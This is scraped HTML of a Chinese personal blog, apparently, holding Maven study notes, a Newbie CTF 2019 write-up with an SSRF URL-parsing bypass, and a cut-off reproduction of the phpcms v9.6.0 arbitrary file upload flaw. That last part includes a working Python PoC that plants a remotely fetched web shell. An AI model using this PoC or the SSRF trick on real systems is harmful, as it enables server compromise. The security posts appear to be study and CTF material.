class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.ccreater<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven03(/maven02)<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h3 id="Super-POM"><a href="#Super-POM" class="headerlink" title="Super POM"></a>Super POM</h3><p>所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 也被称作 <strong>Super POM</strong>，它包含了一些可以被继承的默认设置。</p>
<p>Maven 使用 effective pom（Super pom 加上工程自己的配置）来执行相关的目标，它帮助开发者在 pom.xml 中做尽可能少的配置，当然这些配置可以被方便的重写。</p>
<p>查看 Super POM 默认配置的一个简单方法是执行以下命令：<strong>mvn help:effective-pom</strong> （需要在当前目录下新建一个pom.xml）</p>
<h3 id="POM-标签详解"><a href="#POM-标签详解" class="headerlink" title="POM 标签详解"></a>POM 标签详解</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/maven/maven-pom.html">https://www.runoob.com/maven/maven-pom.html</a></p>
<h2 id="Maven-构建生命周期"><a href="#Maven-构建生命周期" class="headerlink" title="Maven 构建生命周期"></a>Maven 构建生命周期</h2><p> Maven 构建生命周期定义了一个项目构建跟发布的过程。 </p>
<p>Maven 有以下三个标准的生命周期：</p>
<ul>
<li><strong>clean</strong>：项目清理的处理</li>
<li>**default(或 build)**：项目部署的处理</li>
<li><strong>site</strong>：项目站点文档创建的处理</li>
</ul>
<h3 id="典型的生命构建周期"><a href="#典型的生命构建周期" class="headerlink" title="典型的生命构建周期"></a>典型的生命构建周期</h3><table>
<thead>
<tr>
<th align="left">阶段</th>
<th align="left">处理</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">验证 validate</td>
<td align="left">验证项目</td>
<td align="left">验证项目是否正确且所有必须信息是可用的</td>
</tr>
<tr>
<td align="left">编译 compile</td>
<td align="left">执行编译</td>
<td align="left">源代码编译在此阶段完成</td>
</tr>
<tr>
<td align="left">测试 Test</td>
<td align="left">测试</td>
<td align="left">使用适当的单元测试框架（例如JUnit）运行测试。</td>
</tr>
<tr>
<td align="left">包装 package</td>
<td align="left">打包</td>
<td align="left">创建JAR/WAR包如在 pom.xml 中定义提及的包</td>
</tr>
<tr>
<td align="left">检查 verify</td>
<td align="left">检查</td>
<td align="left">对集成测试的结果进行检查，以保证质量达标</td>
</tr>
<tr>
<td align="left">安装 install</td>
<td align="left">安装</td>
<td align="left">安装打包的项目到本地仓库，以供其他项目使用</td>
</tr>
<tr>
<td align="left">部署 deploy</td>
<td align="left">部署</td>
<td align="left">拷贝最终的工程包到远程仓库中，以共享给其他开发人员和工程</td>
</tr>
</tbody></table>
<p>如果执行package，那么clean,test等都会被执行</p>
<h3 id="构建阶段由插件目标构成"><a href="#构建阶段由插件目标构成" class="headerlink" title="构建阶段由插件目标构成"></a>构建阶段由插件目标构成</h3><p> 一个插件目标代表一个特定的任务（比构建阶段更为精细），这有助于项目的构建和管理。这些目标可能被绑定到多个阶段或者无绑定。不绑定到任何构建阶段的目标可以在构建生命周期之外通过直接调用执行。这些目标的执行顺序取决于调用目标和构建阶段的顺序。 </p>
<p>插件目标解释： 一个插件有多个目标，每个功能就是一个<em>插件目标</em>，所以一个插件有多个功能。 </p>
<h2 id="maven-常用命令"><a href="#maven-常用命令" class="headerlink" title="maven 常用命令"></a>maven 常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mvn -v</span><br><span class="line">mvn compile 编译</span><br><span class="line">mvn test 测试</span><br><span class="line">mvn package 打包项目生成jar文件</span><br><span class="line">mvn clearn 删除target 目录</span><br><span class="line">mvn install 安装jar包到本地仓库</span><br><span class="line">创建目录的两种方式</span><br><span class="line">1. 交互式</span><br><span class="line">mvn archetype:generate </span><br><span class="line">2. 非交互式</span><br><span class="line">mvn archetype:generate -DgroupId=com.companyname.bank -DartifactId=consumerBanking -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false</span><br></pre></td></tr></table></figure>



<h2 id="在某个阶段使用插件"><a href="#在某个阶段使用插件" class="headerlink" title="在某个阶段使用插件"></a>在某个阶段使用插件</h2><p> <a target="_blank" rel="noopener" href="http://maven.apache.org/plugins">http://maven.apache.org/plugins</a> </p>
<p>各个插件下有个example config如： <a target="_blank" rel="noopener" href="http://maven.apache.org/plugins/maven-source-plugin/">http://maven.apache.org/plugins/maven-source-plugin/</a> </p>
<p>在pom.xml文件中project下添加</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-source-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  &lt;configuration&gt;</span></span><br><span class="line"><span class="comment">          &lt;outputDirectory&gt;/absolute/path/to/the/output/directory&lt;/outputDirectory&gt;</span></span><br><span class="line"><span class="comment">          &lt;finalName&gt;filename-of-generated-jar-file&lt;/finalName&gt;</span></span><br><span class="line"><span class="comment">          &lt;attach&gt;false&lt;/attach&gt;</span></span><br><span class="line"><span class="comment">        &lt;/configuration&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">goal</span>&gt;</span>jar-no-fork<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 在package阶段执行source:jar-no-fork --&gt;</span></span><br><span class="line">        	<span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        	</span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="maven配置文件"><a href="#maven配置文件" class="headerlink" title="maven配置文件"></a>maven配置文件</h2><h3 id="添加镜像仓库"><a href="#添加镜像仓库" class="headerlink" title="添加镜像仓库"></a>添加镜像仓库</h3><p>在mirrors下添加</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span><span class="comment">&lt;!-- 哪个仓库的镜像，利用*来匹配所有仓库 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>jcenter<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>jcenter.bintray.com<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://jcenter.bintray.com/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>repo1<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>repo2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>







<h3 id="修改本地仓库地址"><a href="#修改本地仓库地址" class="headerlink" title="修改本地仓库地址"></a>修改本地仓库地址</h3><p>修改<code>&lt;localRepository&gt;E:/apache-maven-3.6.3/repository&lt;/localRepository&gt;</code></p>
<h2 id="常用插件介绍"><a href="#常用插件介绍" class="headerlink" title="常用插件介绍"></a>常用插件介绍</h2><p> jetty : servlet 本地测试插件</p>
<p> <a target="_blank" rel="noopener" href="http://tomcat.apache.org/maven-plugin.html">tomcat</a>  :  tomcat  本地测试插件</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cku89gxux0053wvos1ja36bml" data-title="maven学习笔记" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/nbctf/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/nbctf/">newbie ctf 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
<blockquote>
<p>You can get flag in “normalflag.iwinv.net”</p>
</blockquote>
<p>题目给的链接</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
<p>直接访问 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
<p>输入网站测试发现,会在网址后面加个secret参数</p>
<p><img src="C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20191103111420354.png" alt="image-20191103111420354"></p>
<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
<p>观察secret发现，每次访问给出的secret都不一样</p>
<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
<p>这就很容易想到php里面libcurl和parase的差异</p>
<blockquote>
<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a target="_blank" rel="noopener" href="http://user%40eval.com:80@baidu.com进行解析时,php获取的host是baidu.com是允许访问的域名,而最后调用libcurl进行请求时则是请求的eval.com域名,可以造成ssrf绕过此外对于https//evil@baidu.com%E8%BF%99%E6%A0%B7%E7%9A%84%E5%9F%9F%E5%90%8D%E8%BF%9B%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%97%B6,php%E8%8E%B7%E5%8F%96%E7%9A%84host%E6%98%AFevil@baidu.com%EF%BC%8C%E4%BD%86%E6%98%AFlibcurl%E8%8E%B7%E5%8F%96%E7%9A%84host%E5%8D%B4%E6%98%AFevil.com">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
<p>from  <a target="_blank" rel="noopener" href="https://paper.seebug.org/561">https://paper.seebug.org/561</a> </p>
</blockquote>
<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
<p>KorNewbie{w0w_e4g1e_3y3}</p>
<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
<p>观察发现一个字符会被编码成2位的16进制的数据</p>
<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s2=<span class="string">&#x27;45 dd 97 38 62 6c 62 85&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">s1=<span class="string">&#x27;3a 93 78 3a 6c 63 3a 63&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">int</span>(s1[i],<span class="number">16</span>)-<span class="built_in">int</span>(s2[i],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>





<p>KorNewbie{Nace_I_believed_it}</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
<blockquote>
<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
<p>flag format : KorNewbie{password_yougetinformation}</p>
<p>※ If there is a hash value, it will be md5.</p>
</blockquote>
<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
<p>过滤找到ftp传输文件和账号密码</p>
<p>password:root</p>
<p>badguy.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</span><br></pre></td></tr></table></figure>





<p>decode得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. </span><br><span class="line">//alpha组的个人信息全部放在下面的地址里。祝你成功..</span><br><span class="line">https://pastebin.com/70yDGiRS</span><br></pre></td></tr></table></figure>

<p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
<p>题目提示得到的一个信息是md5</p>
<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
<p>这里也提示了凯撒加密</p>
<p>但是用国内的md5解密网站无论如何也破不了</p>
<p>用朝鲜语搜了一下就解密了</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
<p>KorNewbie{root_IronDragon}</p>
<p>………………………</p>
<p>这是个梗吗.</p>
<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
<blockquote>
<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
</blockquote>
<p>user:NewbieCTF2019</p>
<p>在youtube找到一个好玩的重置密码的方法</p>
<p> <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=YBFAzK9mgNI">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
<p>根据这个来重置密码</p>
<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
<p>最后拿到flag</p>
<p><code>KorNewbie&#123;renek@it-simple.net&#125;</code></p>
<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
<p>于是就开始用binwalk,strings…..</p>
<p>最后翻一翻找到了seg段…………</p>
<p>在seg段找到</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/nbctf/" data-id="cku89gxuy0056wvosa30t6k2e" data-title="newbie ctf 2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p>
<p>开启用户注册功能</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span></span><br><span class="line">    u = <span class="string">&#x27;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#x27;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;siteid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;modelid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;testxx&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;test@test.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;info[content]&#x27;</span>: <span class="string">&#x27;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dosubmit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(u, data=data)</span><br><span class="line"></span><br><span class="line">    shell = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    re_result = re.findall(<span class="string">r&#x27;&amp;lt;img src=(.*)&amp;gt&#x27;</span>, rep.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(re_result):</span><br><span class="line">        shell = re_result[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>漏洞的关键位置</p>
<p><code>phpcms/modules/member/index.php</code>:135</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_input.class.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">&#x27;member_update.class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$member_input</span> = <span class="keyword">new</span> member_input(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);		</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>] = array_map(<span class="string">&#x27;new_html_special_chars&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user_model_info</span> = <span class="variable">$member_input</span>-&gt;get(<span class="variable">$_POST</span>[<span class="string">&#x27;info&#x27;</span>]);				        				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p>
<p>跟进去发现</p>
